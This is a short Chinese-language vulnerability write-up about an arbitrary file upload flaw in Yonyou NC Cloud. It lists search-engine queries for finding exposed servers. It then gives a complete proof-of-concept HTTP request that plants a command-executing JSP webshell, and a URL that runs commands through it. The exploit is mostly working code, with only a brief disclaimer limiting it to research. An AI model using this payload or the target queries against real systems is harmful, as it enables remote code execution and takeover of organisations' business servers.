<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PJzI9C4VoCaXByy5Dm6Q4w)

**点击蓝字 关注我们**

**01**

漏洞描述  

NC Cloud 任意文件上传漏洞  

版本信息：全版本

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Ar9omtEe9yUlUicLLwkicibTxB2jMxGVuqzpcKNzaNOD4pG3RibZmPlEjg4vu1pxYMWdmsRJwMLDMfuOG9Aib4AoFLA/640?wx_fmt=png)

**02**

资产发现

fofa：app="用友 - NC-Cloud"

hunter：web.body="uap/rbac"

**03**

**漏洞复现**

1、修改请求包，将可执行命令的一句话 webshell 写入 1ndex.jsp。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Ar9omtEe9yUlUicLLwkicibTxB2jMxGVuqz3qicm0FW5Nicjt6JZYuwlkmxv8LGmYMUSfDQXLnmuQqNmaIVPs9uccAQ/640?wx_fmt=png)

2、访问 1ndex.jsp，执行命令。

https://192.168.1.20:8890/1ndex.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream())

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Ar9omtEe9yUlUicLLwkicibTxB2jMxGVuqzkmyBXvqEphplgNH1pjV7yxl1Fe6WJMibzpa6cgf0Q9wP9FA03icCa9dA/640?wx_fmt=png)

POC

点赞 + 关注

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 192.168.1.20:8890
Content-Length: 253
Accept: */*
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/1ndex.jsp"]}

```

本文仅限于技术研究和学术交流使用。

请勿用于非法用途, 否则造成的一切后果由使用者自行承担, 作者不承担任何法律责任!